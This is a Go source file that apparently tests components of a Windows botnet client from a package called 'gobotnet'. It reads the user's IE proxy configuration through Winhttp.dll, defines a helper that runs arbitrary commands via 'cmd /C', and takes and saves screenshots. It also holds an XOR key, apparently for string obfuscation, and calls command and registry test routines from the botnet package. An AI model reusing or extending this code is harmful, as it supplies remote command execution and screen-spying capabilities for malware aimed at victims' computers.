package main

import (
	"fmt"
	"github.com/vova616/screenshot"
	"gobotnet"
	"image/png"
	"net/url"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	winhttpdll, _                            = syscall.LoadLibrary("Winhttp.dll")
	winHttpGetIEProxyConfigForCurrentUser, _ = syscall.GetProcAddress(winhttpdll,
		"WinHttpGetIEProxyConfigForCurrentUser")
	Address   string = ""
	Lite      bool   = false
	Debug     bool   = true
	XorString []byte = []byte{11, 22, 33, 44}
)

type winHttpIEProxyConfig struct {
	fAutoDetect       bool
	lpszAutoConfigUrl *uint16
	lpszProxy         *uint16
	lpszProxyBypass   *uint16
}

type CString *uint16

func WinHttpGetIEProxyConfigForCurrentUser(lpIeProxy *winHttpIEProxyConfig) (result int) {
	ret, _, _ := syscall.Syscall(uintptr(winHttpGetIEProxyConfigForCurrentUser),
		1,
		uintptr(unsafe.Pointer(lpIeProxy)),
		0,
		0)
	return int(ret)
}

func GetIEProxyFromWinHttp() (*url.URL, error) {
	var ieProxy winHttpIEProxyConfig
	WinHttpGetIEProxyConfigForCurrentUser(&ieProxy)
	fmt.Println(ieProxy)
	if ieProxy.lpszProxy == nil {
		return url.Parse("")
	}
	str := CStringToString(CString(ieProxy.lpszProxy))
	return url.Parse(str)
}

func DebugLogging(text string) {
	if Debug {
		currentTime := time.Now().Local()
		fmt.Println("[", currentTime.Format("0000-00-00 00:00:00"), "] "+text)
	}
}

func CmdExec(cmd string) []byte {
	out, err := exec.Command("cmd", "/C", cmd).Output()
	if err != nil {
		DebugLogging(err.Error())
	}
	return out
}

func CStringToString(cs CString) (s string) {
	if cs != nil {
		us := make([]uint16, 0, 256)
		for p := uintptr(unsafe.Pointer(cs)); ; p += 2 {
			u := *(*uint16)(unsafe.Pointer(p))
			if u == 0 {
				return string(utf16.Decode(us))
			}
			us = append(us, u)
		}
	}
	return ""
}

func main() {
	fmt.Println(GetIEProxyFromWinHttp())
	defer syscall.FreeLibrary(winhttpdll)
	gobotnet.CmdTest()
	gobotnet.RegTest()
	makeScreenshot()
}

func makeScreenshot() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}
